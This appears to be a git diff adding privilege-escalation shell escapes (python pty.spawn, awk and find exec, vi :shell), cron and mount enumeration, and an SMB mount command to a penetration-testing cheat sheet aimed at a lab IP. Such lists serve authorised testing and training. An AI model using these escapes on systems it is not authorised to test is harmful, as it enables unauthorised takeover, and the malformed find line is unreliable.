@@ -24,6 +24,24 @@ For the following examples assume:
 ##### Check webserver for things
 `nikto -h 10.37.129.11`
 
+##### Privilege escalation
+`python -c 'import pty;pty.spawn("/bin/bash");'`
+
+`awk 'BEGIN {system("/bin/sh")}'`
+
+`find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`
+
+`echo os.system('/bin/bash')`
+
+`/bin/sh -i`
+
+```bash
+## Editors
+:set shell=/bin/bash
+:shell
+:! /bin/bash
+```
+
 ##### Enumerate directories
 `dirb http://10.37.129.11`
 
@@ -77,6 +95,31 @@ nslookup -q=any domain.com
 nslookup -q=TXT site.domain.com
 ```
 
+##### Job/Task exploits
+```bash
+## Display scheduled jobs for the specified user – Privileged command
+crontab -l -u %username%
+
+## Scheduled jobs overview (hourly, daily, monthly etc)
+ls -la /etc/cron*
+
+## What can ‘others’ write in /etc/cron* directories
+ls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null
+
+## List of current tasks
+top
+```
+
+##### Any mounted file-systems
+```bash
+## Mounted?
+mount
+df -h
+
+## Unmounted?
+cat /etc/fstab
+```
+
 ##### smbclient scan
 `smbclient -L 10.37.129.11`
 
@@ -85,6 +128,9 @@ nslookup -q=TXT site.domain.com
 
 ##### SMB share connect via web browser
 `smb://10.37.129.11/<sharename>/`
+
+##### Mount share from command line
+`mount -t  smbfs -o username=<username> //<servername>/<sharename> /mnt/point/`
 
 ##### Windows related enum
 ```bash
